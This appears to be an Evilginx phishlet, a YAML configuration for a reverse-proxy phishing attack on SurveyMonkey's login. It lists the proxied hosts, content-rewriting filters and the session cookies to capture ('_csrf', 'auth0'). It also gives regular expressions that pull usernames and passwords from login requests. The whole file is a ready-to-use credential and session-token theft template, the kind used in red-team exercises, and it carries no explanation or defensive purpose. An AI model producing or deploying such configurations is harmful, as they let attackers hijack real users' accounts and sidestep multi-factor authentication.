author: '@fin3ss3g0d'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'auth-us', orig_sub: 'auth-us', domain: 'surveymonkey.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'surveymonkey.com', session: false, is_landing: false}
  - {phish_sub: 'rum-ingest.us1', orig_sub: 'rum-ingest.us1', domain: 'signalfx.com', session: false, is_landing: false}
  - {phish_sub: '', orig_sub: '', domain: 'bttrack.com', session: false, is_landing: false}
  - {phish_sub: 'surveymonkey.us-4', orig_sub: 'surveymonkey.us-4', domain: 'evergage.com', session: false, is_landing: false}
  - {phish_sub: 'sessions', orig_sub: 'sessions', domain: 'bugsnag.com', session: false, is_landing: false}
  - {phish_sub: 'notify', orig_sub: 'notify', domain: 'bugsnag.com', session: false, is_landing: false}
  - {phish_sub: 'geolocation', orig_sub: 'geolocation', domain: 'onetrust.com', session: false, is_landing: false}
  - {phish_sub: 'bat', orig_sub: 'bat', domain: 'bing.com', session: false, is_landing: false}
  - {phish_sub: 't', orig_sub: 't', domain: 'teads.tv', session: false, is_landing: false}
#  - {phish_sub: 'prod', orig_sub: 'prod', domain: 'smassets.net', session: false, is_landing: false}
#  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'signalfx.com', session: false, is_landing: false}
  - {phish_sub: 'bam', orig_sub: 'bam', domain: 'nr-data.net', session: false, is_landing: false}

sub_filters:
  - {triggers_on: 'auth-us.surveymonkey.com', orig_sub: 'auth-us', domain: 'surveymonkey.com', search: '.{domain}', replace: '.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
  - {triggers_on: 'www.surveymonkey.com', orig_sub: 'www', domain: 'surveymonkey.com', search: '.{domain}', replace: '.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']} 

auth_tokens:
  - domain: '.surveymonkey.com'
    keys: ['_csrf', 'auth0']
credentials:
  username:
    key: ''
    search: '"username":"(.*)",'
    type: 'json'
  password:
    key: ''
    search: '"password":"([^"]*)'
    #search: '"password":"(.*)",'
    type: 'json'
